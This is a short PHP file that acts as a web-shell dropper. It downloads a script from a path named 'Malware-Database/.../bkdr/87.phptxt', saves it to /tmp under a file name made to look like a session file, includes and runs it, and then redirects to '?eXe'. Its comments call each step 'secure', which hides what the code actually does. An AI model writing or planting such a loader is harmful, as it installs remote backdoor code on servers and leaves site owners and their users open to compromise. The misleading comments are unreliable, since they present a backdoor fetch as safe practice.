<?php
// Define a session-based file name securely
$sessionFile = "sess_" . md5("eXe") . ".php";
$localFile = "/tmp/{$sessionFile}";

// URL of the remote script
$remoteUrl = "https://raw.githubusercontent.com/srkrose9/Malware-Database/c40d59536d934c70d694ff41082e4365295c4b60/SMW/BLKH/1296611/php/bkdr/87.phptxt";

// Create a secure stream context for downloading the remote script
$contextOptions = [
    "ssl" => [
        "verify_peer" => true, // Enable SSL peer verification
        "verify_peer_name" => true, // Enable SSL peer name verification
    ]
];

$context = stream_context_create($contextOptions);

// Check if the local file doesn't exist or is empty before downloading
if (!file_exists($localFile) || filesize($localFile) === 0) {
    // Try to fetch the content of the remote file
    $remoteContent = @file_get_contents($remoteUrl, false, $context);

    if ($remoteContent === false) {
        // Handle error when downloading the file
        error_log("Failed to download the remote file from $remoteUrl.");
        exit("An error occurred while fetching the remote file.");
    }

    // Save the downloaded content to the local file
    if (file_put_contents($localFile, $remoteContent) === false) {
        // Handle error when saving the file
        error_log("Failed to save the downloaded file to $localFile.");
        exit("An error occurred while saving the file.");
    }
}

// Include the local file securely if it exists
if (file_exists($localFile)) {
    include $localFile;
} else {
    // Handle case where the file cannot be included
    error_log("Failed to include the local file: $localFile.");
    exit("An error occurred while including the file.");
}

// Redirect using a more secure method
header("Location: ?eXe");
exit();
?>
